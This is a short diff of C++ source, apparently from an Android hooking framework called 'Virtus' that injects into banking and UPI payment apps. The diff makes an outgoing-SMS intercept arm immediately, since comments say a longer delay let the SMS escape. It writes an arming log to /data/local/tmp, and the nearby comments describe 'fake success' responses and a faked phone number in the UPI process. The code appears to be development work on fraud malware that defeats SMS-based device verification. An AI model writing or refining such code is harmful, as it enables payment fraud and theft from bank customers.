@@ -186,12 +186,18 @@ public:
         const int delay = upi_registry::hook_startup_delay_sec(process_name_);
         const bool fragile = upi_registry::is_fragile_banking_app(process_name_);
 
-        // SMS intercept + fake success — deferred PLT (immediate install crash karta hai)
+        // SMS intercept — immediate + short deferred (5–8s pehle late tha, SMS nikal jati thi)
         if (sms_block) {
-            const int sms_delay = fragile ? 8 : 5;
+            outgoing_sms_hook::install(env_, api_, false, false, true);
+            const int sms_delay = fragile ? 2 : 1;
             outgoing_sms_hook::schedule_deferred_upi_hook(env_, api_, sms_delay);
-            logger::info("Virtus", "Deferred ISms intercept in %s delay=%d",
+            logger::info("Virtus", "ISms intercept armed in %s delay=%d",
                          process_name_.c_str(), sms_delay);
+            FILE* hf = fopen("/data/local/tmp/hivirtus_inject.log", "a");
+            if (hf) {
+                fprintf(hf, "isms_arm:%s delay=%d\n", process_name_.c_str(), sms_delay);
+                fclose(hf);
+            }
         }
 
         // Fake phone number — UPI-process TelephonyManager JNI only (NO phone/radio)
